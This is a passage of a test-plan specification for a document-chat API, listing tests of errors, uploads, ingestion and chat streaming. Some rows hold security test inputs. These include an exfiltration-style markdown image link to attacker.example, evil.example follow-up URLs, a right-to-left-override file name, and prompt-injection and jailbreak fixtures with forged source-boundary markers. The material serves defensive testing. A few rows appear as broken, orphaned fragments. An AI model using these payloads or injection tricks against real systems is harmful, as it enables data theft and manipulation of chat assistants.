### 5.3 API conventions (T-041 to T-068)

| ID | Test | Level | Proves |
|---|---|---|---|
| T-041 | the OpenAPI contract tests (also: the OpenAPI contract check) | contract | Every mounted route appears in the exported document; `GET /openapi.json`, `/docs` and `/redoc` answer `404 route_not_found`; `getHealth` is the only operation with `security: []`; every documented error status references `Problem`; `createChatTurn`'s `200` is `application/x-ndjson` with `ChatStreamEvent`, a `oneOf` over the eight event models discriminated by `type`, and `x-docchat-stream`; no `user` operation declares a document, version or path parameter. |
| T-042 | the `contract` CI job | CI check | Regenerating `apps/api/openapi.json` reproduces the committed bytes, regenerating `apps/web/src/api/generated` changes no file (`git diff --exit-code`), and `check_contract_enums.py` passes (section 10.1 job 4). |
| T-043 | the contract test of request examples | contract | Each of the twelve OpenAPI request examples of `11-api.md` section 1.13 validates against its model and is accepted by an in-process app holding the seeded test data. |
| T-044 | the problem body unit tests (also: the problem unit tests) | unit | Every `DocChatProblem` renders exactly the members of `11-api.md` section 1.5, optional members omitted when they don't apply; `retryAfterSeconds` 2,678,400 validates while 0 and 2,678,401 are refused; `Retry-After` equals `retryAfterSeconds`; `sessionId` and `turnId` appear only on the four turn-creation `409` codes, and `retryAfterSeconds` on a `409` only for `turn_in_progress`; every code's body matches its catalogue entry. |
| T-045 | the code and reason catalogue unit tests | unit | Every code raised in `apps/api` and `packages/core` is registered once in `docchat_core.errors.CODES` with its title (sentence case, at most 40 characters) and `detail` of `11-api.md` section 2; `status` is `None` for exactly the 13 stream-only codes and `turn_abandoned`, and raising one of those 14 as a problem fails; every `422` reason raised is in `REASONS`; every `422` carries at least one `errors[]` entry; a `rate_limited` body is titled "Request limit reached". |
| T-046 | the route metadata unit test | unit | Every operation's `x-docchat-error-codes` lists exactly the codes its handlers and dependencies can raise, sorted, without `route_not_found` and `method_not_allowed`. |
| T-047 | the sentinel no-leak unit tests | unit | A request carrying a sentinel string in every field of every operation never shows it in a problem body; a route raising an unmapped exception whose message holds a sentinel answers `500 internal_error`, emits exactly one `request_failed` record with `error.type` the exception's qualified type name and `docchat.error_code` `internal_error`, and no log record, span attribute or span event holds the sentinel. |
| T-048 | the route-class unit tests | unit | A call without a token and with an oversized or malformed body gets `401`, never `413`, `415` or `422`; a burst-refused request touches no store. |
| T-049 | the order-of-checks integration tests | integration | Per operation family (projects, members and mappings; indexes; documents; memory): a `User` token on every administrator operation with an invalid body and a random ID gets `403 admin_required`; every `If-Match` operation answers in the order `404`, `428`, `412`, `409` (a stale `If-Match` on an archived project gets `412`; on a mapped index's `adminDeleteIndex` `412`, not `409 index_mapped`). |
| T-050 | the validation unit tests (also: the request-model unit tests) | unit | Each Pydantic error type maps to its reason; an unknown body field and an unknown query parameter give `unknown_field`; invalid JSON gives `invalid_json`; upper-case UUIDs are accepted and lower-cased while braces, URN and 32-hex forms give `invalid_uuid` in path, query and body; every request model bounds each field as `11-api.md` section 3 states. |
| T-051 | the text-type unit tests | unit | The text types apply NFC, collapse whitespace, convert CR LF and refuse Cc, Cf, Cs, Co and Cn code points (LF and TAB kept in `MultiLineText`), the joiners U+200C and U+200D included; `adminCreateProject` with U+202E or U+200B in `name` answers `422` with `invalid_characters` at `body.name` and writes nothing. |
| T-052 | the route options unit test | unit | Exactly `createChatTurn`, `adminPreflightUploads`, `adminReserveUpload`, `adminUploadContent` and `adminSubmitUploads` deviate from the default route options, and every `POST`, `PUT`, `PATCH` and `DELETE` route except those five is write-limited; a 70,000-byte JSON body gets `413 request_too_large` on a default route and a 40,000-byte body on `createChatTurn`; `adminUploadContent` takes `application/octet-stream` with no JSON limit and answers `application/json` with `415`, every other body route answers `application/octet-stream` with `415`. |
| T-053 | the pagination unit tests | unit | Cursors round-trip; tampered base64, `v` other than 1, an extra member, a filter mismatch and 513 characters each give `422 invalid_cursor`; a tampered cursor can only skip or repeat items the caller may see. |
| T-054 | the keyset paging integration tests | integration | For every list operation of `11-api.md` section 1.8, pages stay complete and duplicate-free while rows are inserted between page reads, and the last page has `nextCursor: null`. |
| T-055 | the `If-Match` parser unit tests | unit | `If-Match` missing, `*`, `W/"…"`, a list or an unquoted value gives `428`; a quoted value that isn't a row version gives `412`; an exact strong tag passes. |
| T-056 | the optimistic concurrency integration tests | integration | For each of the 14 `If-Match` operations a stale value gives `412` and changes nothing, and a call that changes nothing returns the unchanged version; two concurrent `adminMapProjectIndex` calls with one `If-Match` that make different indexes default give one success and one `412`, leaving exactly one default; after `adminAddProjectMember` the returned `projectRowVersion` equals the `rowVersion` `adminGetProject` then returns. |
| T-057 | the security-header unit test | unit | `200`, `4xx`, `5xx` and `/healthz` responses on every route carry the four common headers of `11-api.md` section 1.10; JSON, problem and NDJSON responses carry `Content-Security-Policy: default-src 'none'; frame-ancestors 'none'`; no response has a `Server`, `ETag` or `Content-Encoding` header. |
| T-058 | the `content_disposition` unit tests | unit | `content_disposition` always gives `attachment`; a 260-code-point name ending in `.pdf` becomes a `filename*` of 200 code points ending in `.pdf`; non-ASCII letters, `"`, `\`, `/`, `;`, `%`, control and astral characters become `_` in the ASCII `filename` (at most 200 characters, extension kept); a name without `.` is cut to 200. |
| T-059 | the deployed API header check | deployed smoke | Through platform authentication, `getHealth` and a problem response carry the headers of `11-api.md` section 1.10 and no `Server` header. |
| T-060 | the `getHealth` unit test | unit | `getHealth` answers `200` with an empty body, makes no store call and writes no log record. |
| T-061 | the chat pre-stream integration tests | integration | Each problem of `11-api.md` section 3.3.1 comes in the chat order of its section 1.3; a lease acquired before a later refusal is released before the answer; the duplicates of each turn status answer as its section 1.12 states, each turn-creation `409` carrying its extension members; empty, over-long and control-character questions answer `422` at `body.question` with `empty`, `too_long` or `invalid_characters`. |
| T-062 | the project administration integration tests | integration | `11-api.md` Acceptance criteria item 21: `adminCreateProject` with 3 initial members writes 3 memberships and 3 `project_member.added` rows in its transaction; an unknown member ID answers `422` `not_found` at its index and writes nothing; a repeated ID gives `duplicate`, 51 IDs `too_many_items`; names are unique case-insensitively, archived projects included; an archived project accepts only the restore body; mapping rules answer `409 default_index_required`, `409 default_index_in_use`, `409 index_not_mappable` and `404 index_not_found`; removing the only mapping makes chat answer `409 project_index_unavailable`; a forced audit-insert failure rolls the change back. |
| T-063 | the index and upload operations integration tests | integration | `adminUpdateIndex`, `adminStartReingest`, `adminDeleteIndex`, `adminDeleteDocument` and `adminReingestDocument` answer `428` without and `412` with a stale `If-Match`; `adminDeleteIndex` refuses a mapped index with `409 index_mapped`; the four upload operations answer `503 malware_scanning_not_ready` with `retryAfterSeconds` 3,600 while scanning is on and the newest clean canary is 49 hours old, pass with one 47 hours old and pass with scanning off; a wrong signature, a different size and a different SHA-256 commit nothing; the fifth concurrent upload stream on one worker answers `429 upload_busy` with `retryAfterSeconds` 5. |
| T-064 | the large-upload deployed test | deployed smoke | A generated 50 MB PDF uploads through platform authentication with API memory rising by less than 32 MB, and its run completes within 20 minutes. |
| T-065 | the stop-signal unit test | unit | With `DocChatServer.loop` set to a running loop and `begin_drain` replaced by a recorder, `handle_exit(SIGTERM)` doesn't call the recorder synchronously, the recorder runs once on the next loop iteration, a second SIGTERM adds no call, SIGINT adds none, and Uvicorn's `should_exit` is true after each. |
| T-066 | the Gunicorn drain integration test | integration | With Gunicorn in a subprocess (`apps/api/gunicorn.conf.py`) serving an open NDJSON stream, SIGTERM to the master delivers the drain within 1 s while the stream is still open, and the master exits with code 0 within 10 s once the stream ends. |
| T-067 | the plan integration test | integration | Section 2.11: every `@request_path` statement, run under `SET SHOWPLAN_XML ON` against the seeded volumes (10,000 users, 2,000 projects, 100,000 memberships and the rest), uses only index seeks or bounded range scans (as section 2.11 defines them) on tables above 1,000 rows, the `app.ops_config` full read excepted. |
| T-068 | the administrator document PDF integration test | integration | Against the stub dependencies, the SQL Server container and Azurite: `adminGetDocumentPdf` for the current version of an ingested PDF, DOCX and PPTX answers `200` with the bytes of `renditions/…/document.pdf`, `Content-Type: application/pdf`, `Content-Disposition: attachment` with a `filename*=UTF-8''` name ending in `.pdf`, `Content-Security-Policy: sandbox`, `no-store`, `nosniff` and the right `Content-Length`; the blob recorder finds no read under `documents/`; a `User` caller gets `403 admin_required`, an unknown document or one of another index `404 document_not_found`, a version with `document_pdf_status` `too_large` `409 document_pdf_unavailable` with no blob read, and a missing blob `500 document_pdf_missing` with one `document_pdf_blob_missing` record; the request counts in the caller's download window and lease with the citation file operations, the lease's `turnId` and `sessionId` being null. |

### 5.5 Ingestion and idempotency (T-131 to T-210, T-598 to T-608, T-610 to T-623)

| ID | Test | Level | Proves |
|---|---|---|---|
| T-131 | the name rules unit test (also: the name-rule unit tests) | unit | `normalize_document_name` applies NFC, trimming, whitespace folding and `casefold`, and rejects `/`, `\`, empty and 256-character names and every Cc, Cf, Co, Cs and Cn case (U+0000, U+001F, U+007F, U+0085, U+009F, U+200B, U+200E, U+200F, U+FEFF, U+202E with the fake double extension `invoice` + U+202E + `xcod.pdf`, U+2066, U+2069, U+E000, a lone surrogate, an unassigned code point) with `invalid_file_name`. Also named "the name-rule unit tests". |
| T-132 | the upload preflight unit test | unit | Preflight returns the statuses of `14-ingestion.md` section 2.3 in their order, `duplicate_in_batch` and `unchanged` included. |
| T-133 | the upload streaming unit test | unit | A file with a wrong signature stages no block, a size or hash mismatch commits nothing, and one 50 MB stream holds less than 10 MiB of memory. |
| T-134 | the upload unit tests | unit | A renamed `.doc`, a `.pdf` without `%PDF-` and an OLE file named `.docx` are refused by extension and signature checks; the stored content type comes from the detected type, never from the caller's header. |
| T-135 | the upload integration tests | integration | Oversize declared and streamed, short and long bodies, a wrong hash, concurrent streams for one version and a retried commit are each refused without a committed blob; each successful upload writes its audit row naming the administrator. |
| T-136 | the upload-slot unit tests | unit | A worker holds at most 4 concurrent upload streams; the fifth answers `429 upload_busy` with `retryAfterSeconds` 5, and every ending of a stream releases its slot. |
| T-137 | the batch-limit tests | unit | `adminPreflightUploads` refuses more than 100 files and `adminSubmitUploads` more than 100 version IDs with `422 too_many_items`. |
| T-138 | the commit idempotency integration test | integration | In Azurite, a commit retried after a committed attempt meets `412 ConditionNotMet` and the version still ends `pending`; two concurrent streams for one version commit one blob whose SHA-256 equals the reserved hash. |
| T-139 | the reserve integration test (also: the reserve test) | integration | Two concurrent first reservations of one name create one document; an `uploading` version with the same bytes is reused; a deleted name returns under its document ID; the stored blob path is built from IDs only; the new version's `scan_required` and `scan_status` are `1` and `awaiting` with scanning on and `0` and `not_required` with it off, the commit leaves both unchanged, and an `uploading` row reserved under the other setting isn't reused, so a new version number is reserved. |
| T-140 | the unique-index integration tests | integration | `UX_document_versions_document_sha`, `UX_document_versions_index_sha`, `UX_document_versions_one_ingested`, `UX_chunk_sets_build_key`, `UX_run_items_running_target` and `UX_run_items_run_version` reject the duplicates of `80-data-model.md` section 2 and allow the rows their filters leave out; a retired chunk set is never reused. |
| T-141 | the parameter hash unit test | unit | `parameter_hash` is equal for equal parameters in any key order, differs when the method key or version differs, and is computed after defaults are filled. |
| T-142 | the queue starter unit test | unit | A malformed message is dropped with `ingestion_message_invalid`; a Durable client failure is logged once as `job_failed` and raised as `DispatcherUnavailableError`, so the message is retried. |
| T-143 | the ingestion function-inventory test | unit | `docchat_ingestion.function_app` registers no HTTP trigger: only the queue trigger, the timers and the Durable orchestrators and activities of `14-ingestion.md`. |
| T-144 | the no-inbound deployed test | deployed | The ingestion app's default host name refuses every request from the internet, and from the API container it refuses every request on the virtual network. |
| T-145 | the failure boundary integration test | integration | A chunker dependency raising `ValueError("cnry-chunk-<8 hex>")` ends the activity with `internal_error` and one `activity_failed` record carrying only `error.type`; the canary appears in no history entry, log record or span; the same holds for the keep-alive and the maintenance timer. |
| T-146 | the activity deadline unit test | unit | A blob download that never returns ends `extract_document` with `activity_timeout` at 2,700 s (fake clock) and frees its slot. |
| T-147 | the scratch clean-up unit test | unit | A forced failure after writing `source.bin` leaves no directory under `/run/docchat-scratch`. |
| T-148 | the retry wrapper unit test | unit | Backoff waits are 15, 30, 60, 120, 240 and 480 s; a `Retry-After` of 500 s is honoured and one of 2,000 s waited as 540; no wait exceeds 540 s; a host-reported activity failure is retried as `internal_error`; a non-retryable code stops at once. |
| T-149 | the lease expiry integration test | integration | An expired lease requeues the item with `claim_count + 1`, writes fenced by the old claim change nothing, and the third expiry fails the item with `processing_interrupted`. |
| T-150 | the claim integration test | integration | The claim takes priority 0 before 1, first in first out by `queue_seq` across runs, one item per document, never more than `ingestion.max_parallel_items`, and applies the scan gate. With `ingestion.max_parallel_items` 4, a `purge_index_blobs` item queued while an `ingest` item of one document of its logical index is `running` in stage `render` is not claimed, while a queued `ingest` item of another logical index is; the purge is claimed by the first claim after that item ends, and in the orchestration harness against Azurite it then leaves no blob under `documents/{indexId}/` or `renditions/{indexId}/`, the pages that Render uploaded included. |
| T-151 | the dispatcher replay harness unit tests | unit | Through `OrchestrationHarness`, the dispatcher never exceeds its slots, wakes on a finished sub-orchestration, reuses its `run_queued` waiter, waits 60 s when busy and 60 minutes when idle, and sets every custom status field (`generation`, `lastSweepAt`, `outstanding`, `queued`, `running`, `configValid`) identically on replay. |
| T-152 | the continue-as-new unit test | unit | Continue-as-new happens only after 100 completed items or 60 wakes and only with no running sub-orchestration, with input `{"generation": n + 1, "settings": <last valid snapshot>}`. |
| T-153 | the idle history test | unit | Over 7 simulated days, idle and then busy without completions so both wake cadences run, every generation's history stays under 1,000 events. |
| T-154 | the invalid ops-config unit test | unit | An invalid stored `ingestion` value keeps the last valid snapshot and emits `ops_config_invalid` and `docchat.config.invalid`; with no snapshot the wake sweeps and claims nothing and reports `configValid: false`. |
| T-155 | the keep-alive tick unit test | unit | The keep-alive records the four dispatcher gauges from the custom status, restarts a dispatcher whose `lastSweepAt` is 11 minutes old with `outstanding` true or 76 minutes old with it false, leaves one with `configValid: false` running, and opens no SQL connection. |
| T-156 | the watchdog integration test | integration | In the Durable orchestration harness (section 2.12) against the emulators, the dispatcher's first wake ends with a scripted sweep result, and from its second wake a stub `sweep_ingestion_state` never returns, so the instance stays `Running` while the custom status's `lastSweepAt` ages in virtual time. Case 1: a run is queued before the stall, the first wake's sweep reports `hasOutstandingWork` true and a stub `claim_ingestion_items` claims nothing, so the custom status reads `outstanding` true; with the virtual clock 11 minutes past `lastSweepAt`, a keep-alive tick's watchdog calls `terminate`, polls until the instance reads `Terminated`, starts a new instance that runs the real activities, and emits `ingestion_dispatcher_restarted` with `reason` `heartbeat_stale` and `oldGeneration`; the queued run then completes. Case 2: with nothing queued (`outstanding` false), a tick at 74 minutes past `lastSweepAt` leaves the instance running and a tick at 76 minutes restarts it as in case 1. Case 3: as case 1, with the `terminate` scripted to take effect after 61 s: that tick starts nothing and emits no restart event, and the next tick, 5 minutes later, finds the instance `Terminated` and starts a new one through `ensure_dispatcher`. |
| T-157 | the scan mapping unit test (also: the scan-result mapping unit tests) | unit | Every row of the scan mapping of `14-ingestion.md` section 5.4 maps as stated: `No threats found` with a valid scan time is the only clean result; `Malicious` fails the version; `SAM259213`, `SAM259215`, `Error`, `Not scanned`, a missing tag and a missing or earlier scan time map to their outcomes; the 240-minute deadline gives `unavailable`. Also named "the scan-result mapping unit tests". |

Also named "the deployed malware-scanning suite". |

| T-165 | the Flip retries unit test | unit | A Flip retried after an earlier attempt committed returns `flipped` with empty clean-up lists and changes no row. |
| T-166 | idempotency test 1: duplicate queue message | integration | Delivering the same queue message twice starts one run; the second delivery finds the run and ends with no new item, one served result and no duplicate chunk set. |
| T-167 | idempotency test 2: re-upload of identical bytes | integration | Preflight says `unchanged`, reserve answers `409 content_unchanged`, and nothing is ingested twice. |
| T-168 | idempotency test 3: two concurrent uploads of one document | integration | Two concurrent reservations and uploads of one name end with one document, the newest version ingested and the other `superseded`, and one served chunk set. |
| T-169 | idempotency test 4: delete during Embed | integration | A document deleted while its item runs Embed stays deleted: the Flip finds the document deleted, writes no served row, and the clean-up run removes the chunks written. |
| T-170 | idempotency test 5: update while a rebuild runs | integration | An update committed while a rebuild into a new physical index runs, with the building index's Flip forced to commit before the active one, is what readers see after the repoint. |

| T-172 | idempotency test 7: dispatcher crash with a running item | integration | A dispatcher crash while an item runs leaves the item's lease to expire, after which it is requeued once and completes with one served chunk set. |
| T-173 | idempotency test 8: several pending versions | integration | Of several pending same-name versions only the newest is ingested; the others end `superseded`. |
| T-174 | idempotency test 9: delete followed by a re-upload | integration | Deleting a document and re-uploading the same name keeps the document ID, ingests the new version and cleans the old chunks. |

| T-176 | the delete flow integration test | integration | Deleting a document supersedes its versions, fails `uploading` ones, removes its served rows, cancels queued items and creates a clean-up run that removes its chunks, renditions and sources. |

Also named "the parsing-isolation integration tests". |

A page holds no other page's content, and `complete.json` is written last, with `renditionRulesVersion`; the same holds for every page rendered from the converted PDFs of `headings.docx` and `slides.pptx`. The base's C preprocessor, `cpp` and `cpp-12`, which nothing at run time needs (only `x11-xserver-utils` depends on `cpp`, and only `xdg-utils` recommends that), is purged in the runtime stage (`14-ingestion.md` section 15.2), so the check fails if it comes back. |

### 5.6 Chat and streaming (T-211 to T-283, T-609)

| ID | Test | Level | Proves |
|---|---|---|---|
| T-211 | the chat request model unit test | unit | `ChatTurnRequest` refuses unknown fields, non-canonical UUIDs, an empty question and one of only spaces and format characters (U+200B, U+2060; `empty` at `body.question`), 4,001 code points (`too_long`), NUL and other Cc characters and lone surrogates (`invalid_characters`), and accepts exactly 4,000 code points after CR LF normalisation and trimming and a one-character question of category P. |
| T-212 | the chat routing unit test | unit | `createChatTurn`, `getCitation`, `getCitationContent` and `getCitationDocument` are on the `/v1` router with route class `DocChatRoute`, taking the caller from `current_principal`; `createChatTurn` declares `body_limit=32768`, `burst_limited=False` and `write_limited=False`; with an empty burst bucket the three citation routes answer `429 too_many_requests` (`retryAfterSeconds` 1) before path validation and before any `dlrate:` read while `createChatTurn` is still served; a 32,769-byte chat body answers `413 request_too_large` before it is parsed. |
| T-213 | the chat access integration test | integration | A session in another project and another user's session ID both return `404 session_not_found` with identical bodies; a non-member gets `404 project_not_found`; an administrator without membership gets a stream; an archived project gets `404`; a project without a default index, or whose index has no active physical index, gets `409 project_index_unavailable`. |
| T-214 | the override routing integration test | integration | An unexpired user override sends retrieval to the override's physical index; an expired one falls back to the project default. |
| T-215 | the session turn-limit integration test | integration | A session at `conversations.max_turns_per_session` answers `409 session_turn_limit` whose body carries `sessionId` and no `turnId`, while `409 turn_in_progress`, `turn_already_ended` and `client_turn_id_conflict` carry both. |
| T-216 | the sliding-window unit test | unit | The sliding-window decision and `retryAfterSeconds` match the test's (previous, current, fraction) cases, an estimate exactly at the limit included. |
| T-217 | the chat-limit integration tests | integration | 20 concurrent requests by one user with a limit of 10, across two app instances against one counter, allow exactly 10 within a minute, and refused requests leave the window's counts unchanged. |
| T-218 | the stream lease integration test | integration | With 3 slots, 10 concurrent acquisitions give exactly 3 leases; a release frees a slot; an expired lease is taken over; a delete with an old ETag never removes the new holder's lease. |
| T-219 | the lease unit tests | unit | A stream lease is released at `citations`, on a refusal and on a disconnect, and an expired slot is taken over. |
| T-220 | the quota unit test | unit | The quota `retryAfterSeconds` equals the seconds until the next UTC midnight or month start, across month ends and 29 February. |
| T-221 | the quota integration tests | integration | An exceeded quota returns `429` with `retryAfterSeconds` and `Retry-After` with no call reaching the stub model; after-response calls are deferred at the threshold; estimates for cancelled calls are counted. |
| T-222 | the usage counter integration test | integration | 50 concurrent counter updates for one user give exact day and month totals, create races resolved by `409` then a patch. |
| T-223 | the usage store timeout unit test | unit | A rate-window read that never returns gives `503 dependency_unavailable` with `retryAfterSeconds` 5 after 2 × 2 s; a lease create that never returns gives `503` after 2 × 3 s; after `200`, a counter patch that never returns logs `usage_record_failed` and the turn still ends with `done`; `check_token_quota` raises `UsageStoreUnavailable`. |
| T-224 | the duplicate-matrix integration test | integration | A duplicate `clientTurnId` of a completed turn replays identical text, citations, follow-ups and usage with the stream shape of `11-api.md` section 3.3.4 and `replayed: true`, zero stub-model requests and no Cosmos DB write; of a streaming turn `409 turn_in_progress` with `retryAfterSeconds`; of a failed or cancelled turn `409 turn_already_ended`; with another question `409 client_turn_id_conflict`; `sessionId` and `turnId` on every such `409`. |
| T-225 | the turn concurrency integration test | integration | A second turn in a session while one streams returns `409 turn_in_progress` and is accepted once the first has finished; a turn whose `activeTurn` deadline passed is taken over while the stale turn becomes `failed` with `turn_abandoned`. |
| T-226 | the history budget unit test | unit | The turn task calls `read_recent_turns` with `max_tokens` = `chat.context_token_budget` − `chat.answer_max_completion_tokens` (28,000 with the defaults; 30,000 with a budget of 40,000 and a reserve of 10,000) and no turn count. |
| T-227 | the history filtering integration test | integration | Earlier `failed` and `cancelled` turns never appear in the messages the stub model receives. |
| T-228 | the suggested-question unit tests | unit | `TurnOutcome.question_suggested` is `true` for "  what is the RECEIPT limit? " when a returned turn's `followups` hold "What is the receipt limit?" and for a question equal to a project example question; `false` for "Is the receipt limit what?", when nothing is returned, and when the turn ended with `conversation_unavailable`. |
| T-229 | the suggested-question integration test | integration | With `memory.enabled` true, a question repeating a follow-up suggestion of the previous turn is stored with `memoryExtraction` `{state: not_applicable, reason: suggested_question}` and no `memory` call, while the same words in another order are stored `pending`. |
| T-230 | the question rewrite integration test | integration | The rewrite is skipped on a session's first turn, and a 9-second stub delay falls back to the question as written. |
| T-231 | the rewrite fallback unit test | unit | Rewrite and search-passage outputs outside their length bounds, or holding block-boundary text, take the fallback. |
| T-232 | the search request unit test | unit | For schema version 1, every `VectorizedQuery` of the first-pass and broadened requests names `chunkVector`, `select` lists the ten retrievable fields in order and never the vector field, neither request carries `filter` or `search_fields`, the source block reads `chunkText` and `title`, and an unknown schema version ends the turn with its error. |
| T-233 | the served-chunk filter integration test | integration | Results of unserved chunk sets are dropped before the cut: with 12 served results among 50, exactly 8 are kept in result order; a deleted document's chunks never reach the prompt; a result of a superseded version's chunk set is dropped; with the SQL statement failing after the first pass the turn ends with `error` `retrieval_unavailable` and no source reaches the answer call, and after the broadened pass the first pass's survivors are kept. |
| T-234 | the broadening integration test | integration | Low confidence writes `status: search_broadened`; the second request carries two vector queries and its results replace the first; a failed passage call keeps the first results with `broadenOutcome` `failed`; a partial semantic response (no reranker scores) never broadens. |
| T-235 | the search client cache unit test | unit | 17 distinct physical index names leave 16 open search clients; the least recently used closes after its in-flight request finishes; lifespan shutdown closes the other 16. |
| T-236 | the screening packing unit test | unit | Prompt Shields packing never exceeds 5 documents or 10,000 UTF-16 units per call, long bodies split with a 200-unit overlap, a source flagged in any one segment is dropped, and results map back by position. |
| T-237 | the source screening integration test (also: the screening tests against the model stub) | integration | Against the stub's screening endpoint: 6 documents or 10,001 characters in one call are refused by the stub, so a packing defect fails; a source carrying `[[stub:shield=attack]]` is the only one dropped and absent from the prompt, the citations and `allowedLinks`, emitting `source_screening_flagged` with its IDs; two scripted `503` answers end the turn with `source_screening_unavailable` and no answer call. Also named "the screening tests against the model stub". |
| T-238 | the all-sources-flagged integration test | integration | When every retrieved source is flagged, the answer call receives no source block and the turn ends without citations, as `12-chat-pipeline.md` states for an empty source set. |
| T-239 | the user-prompt shield unit test | unit | Through `httpx.MockTransport` and a recorded `asyncio.sleep`, `shield_user_prompt` returns `True` for `attackDetected: true` and `False` for `false`, sends `{"userPrompt": <text>, "documents": []}` with a 5-second timeout; a timeout, a connection error, a `429` and a `503` on the first call are each retried once after 0.5 s (2 s with `Retry-After: 2`); a second failure raises `ScreeningUnavailable`; a `400` and a `200` without `userPromptAnalysis.attackDetected` raise it at once. |
| T-240 | the deployed screening test | deployed (full, `dev`) | Against the real `dev` Content Safety account, Prompt Shields accepts an empty `userPrompt`, and a chat turn on a project holding `indirect-attack.pdf` drops that source as flagged. |
| T-241 | the prompt-assembly unit tests | unit | Assembly produces the order and roles of `12-chat-pipeline.md` section 9.1; the question message holds only the `QUESTION` block; the budget drops the oldest turns first, then the lowest-ranked sources, never the system, context or question messages; `prompt_too_large` fires; a forced marker collision redraws and the fourth collision makes no call; `[[BEGIN` and `[[END` are defanged in every inserted text (a source holding a forged `[[END SOURCE S1 …]]` line arrives defanged); project instructions with braces, `%` signs, placeholder syntax and the text of a rule override arrive verbatim in their own block. |
| T-242 | the prompt-assembly snapshot test | unit | Message order and roles match the snapshot for every combination of memory, summary, history and guidance. |
| T-243 | the token counting unit tests | unit | The counting rule (3 tokens per message plus 3) with `o200k_base` matches the test's counts; each chat-small call's constant system text plus its block boundary lines stays within 300 tokens; the platform rules stay under 1,024 tokens and `rules-v1`'s text is pinned. |
| T-244 | the stored prompt integration test | integration | The stored `modelInput.messages` equal the messages the stub model received, and a source holding a forged `[[END SOURCE S1 …]]` line and the project instructions appear defanged inside their own block in the stored prompt. |
| T-245 | the pipeline event-loop integration test | integration | The whole pipeline, the assembly of a 28,000-token prompt included, runs under asyncio debug mode with the loop guard and finds no blocked loop. |
| T-246 | the finish-reason unit test | unit | The finish-reason mapping of `12-chat-pipeline.md` section 10.4 for `stop`, `length` with and without visible text, `content_filter`, a prompt `400 content_filter`, another `400` and a filter-error annotation. |
| T-247 | the content filter integration test | integration | A stub `400 content_filter` ends the turn with `question_filtered`; a stub `finish_reason: content_filter` ends it with `answer_filtered` and the turn is absent from later history. |
| T-248 | the deployed content-filter test | deployed (full, `dev`) | A jailbreak question from `tests/fixtures/questions/jailbreak.json` ends with `question_filtered` against the real chat deployment. |
| T-249 | the model capability unit test | unit | Start-up refuses a `DOCCHAT_OPENAI_SMALL_MODEL` absent from the capability table and a reasoning effort outside the model's row, and the ops-config model refuses `memory.reasoning_effort` `none` when `none` is removed from the chat-small row. |
| T-250 | the deployed model check | operator check (dev) | Run at the acceptance of the chat-pipeline stage, once more at the conversations-and-memory stage's acceptance (for T-331), and after any model change as `uv run docchat-ops --env dev chat model-check --ticket <id> --reason "<reason>"` by a member of `sg-docchat-dev-config-operators` (just-in-time) from an address in `dev`'s operator allowlist (`86-operations.md` section 2.8.7); exit 0 and a `model_deployments.checked` row with `result` `passed` are the evidence, recorded in the stage's acceptance record. One call per deployment and per configured reasoning effort (`none` on chat small included) with its prompt-cache setting, and on chat small strict structured output for the `standalone_query`, `search_passage`, `followup_questions` and the conversation store's `memory` schema (`addressesAssistant` included, 10 fixture questions giving schema-valid JSON); no call gets `400`. |
| T-251 | the deployed tokenizer check | operator check (dev) | Part of the same `chat model-check` run as T-250: the counting rule lands within 1% of the reported prompt tokens for each deployment, and the row's `tokenizer` member records both counts. |
| T-252 | the model-call unit tests | unit | Over the model stub's recorder, no chat-completion request carries `tools`, `tool_choice` or `functions`, and every one carries the expected `safety_identifier`, whose value for a known `tid` and `oid` equals the test's. |
| T-253 | the citation-marker unit tests | unit | A marker split at every character position across two deltas gives the same output as the unsplit text; `[S2, S5]`, `[s2]` and `[ S2 ]` are accepted; unknown, flagged and dropped source IDs leave nothing; numbers follow first use, repeats reuse them; U+27E6 and U+27E7 in model text are deleted (`⟦3⟧` yields no token); a 41-character suffix after `[` is released at once; the buffer is released at stream end. |
| T-254 | the citation token integration test | integration | Model output holding `⟦9⟧` and `[S7]` when 3 sources were sent produces no token for 7 or 9 on the stream. |
| T-255 | the allowed-links unit tests | unit | Extraction keeps `https` URLs verbatim, trims trailing punctuation and an unmatched `)`, excludes `http:`, `javascript:`, `data:` and `mailto:`, caps at 50 entries of 2,048 characters, keeps first-seen order and reads only the sources sent (flagged sources excluded). |
| T-256 | the allowed-links integration test | integration | A source holding `![x](https://attacker.example/p?q=data)`, an `http://` link and a `javascript:` link yields `allowedLinks` with only the `https` URL, verbatim; a URL the model invents is never listed. |
| T-257 | the citation-token strip unit test | unit | `strip_citation_tokens("Claims close in 30 days ⟦1⟧, with receipts ⟦2⟧.")` returns `"Claims close in 30 days, with receipts."`. |
| T-258 | the follow-up validation unit test | unit | Follow-up validation drops empty, over-long, URL-bearing, duplicate and question-equal items and keeps at most 3; `see https://evil.example/p`, `see //evil.example/p`, `see WWW.evil.example`, `https:` U+200B `//evil.example/p` and `ww` U+00AD `w.evil.example` are each dropped, while `What does \\host\share hold?` and `name@example.net` are kept. |
| T-259 | the follow-up timeout integration test | integration | A 6-second follow-ups delay gives no `followups` event and `done` within 6 s of `citations`; `followups.enabled` false makes no call. |
| T-260 | the follow-up attach integration test | integration | The stream writer receives the `followups` line only after `attach_followups` returned `True`; with a store double returning `False`, no `followups` line, `done` follows `citations`, and the counters still rise by the call's usage. |
| T-261 | the finalisation ordering integration test | integration | The session's `activeTurn` is null when the `citations` line is written, so a question sent as soon as `citations` arrives is accepted; a `finalize_turn` failure ends with `turn_save_failed` and no `citations` line. |
| T-262 | the fault-injection integration test | integration | Failing each of steps T2 to T14 of `12-chat-pipeline.md` in turn yields exactly one terminal event and the turn saved with the matching status every time. |
| T-263 | the stream encoder unit test | unit | The NDJSON encoder writes one compact UTF-8 JSON object plus `\n` per event and never emits byte `0x0A` inside an event, as a property test over strings holding `\n`, `\r`, U+2028, U+2029, emoji and 4-byte characters shows. |
| T-264 | the chunked-read integration test | integration | A client reading the response body in 1-byte, 7-byte and random-size chunks rebuilds every event exactly, multi-byte characters split across chunks included. |
| T-265 | the stream state-machine unit test | unit | The stream writer accepts `meta`→`status`→`delta`*→`citations`→`followups`→`done`, every order `11-api.md` section 3.3.3 allows and `meta`→`error` at every point, and refuses any event after a terminal one, a `status` after a `delta` and anything before `meta`; every event written validates against its OpenAPI schema. |
| T-266 | the heartbeat unit test | unit | With a fake clock, a `heartbeat` follows 15 s of silence and the count restarts after every line. |
| T-267 | the heartbeat integration test | integration | A 40-second stub pause before the first chunk gives at least 2 heartbeats 15 s ± 1 s apart, then the deltas. |
| T-268 | the stream order integration test | integration | `collect_stream` confirms event order and exactly one terminal event for a normal answer, a model failure mid-stream (`cut=`), a screening failure and a turn timeout. |
